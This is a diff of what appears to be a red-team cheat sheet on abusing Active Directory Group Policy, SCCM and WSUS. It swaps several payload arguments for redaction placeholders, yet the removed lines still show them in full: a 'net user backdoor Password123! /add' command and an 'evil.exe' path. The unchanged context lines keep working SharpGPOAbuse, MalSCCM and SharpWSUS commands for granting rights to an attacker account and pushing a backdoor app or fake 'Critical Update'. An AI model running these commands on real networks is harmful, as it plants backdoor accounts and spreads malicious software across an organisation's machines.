@@ -96,7 +96,7 @@ Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_
 .\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"
 
 # Add immediate task
-.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "[REDACTED_SYSTEM_EXECUTION_COMMAND]" --GPOName "Vulnerable GPO"
 ```
 
 ### Abuse with pyGPOAbuse (Linux)
@@ -151,7 +151,7 @@ MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
 MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC
 
 # Create malicious app
-MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"
+MalSCCM.exe app /create /name:backdoor /uncpath:"[REDACTED_MALICIOUS_EXE_PAYLOAD]"
 
 # Deploy
 MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update
@@ -182,7 +182,7 @@ SharpWSUS.exe locate
 SharpWSUS.exe inspect
 
 # Create malicious update
-SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"
+SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"[REDACTED_SYSTEM_EXECUTION_COMMAND]" /title:"Critical Update"
 
 # Deploy to target
 SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
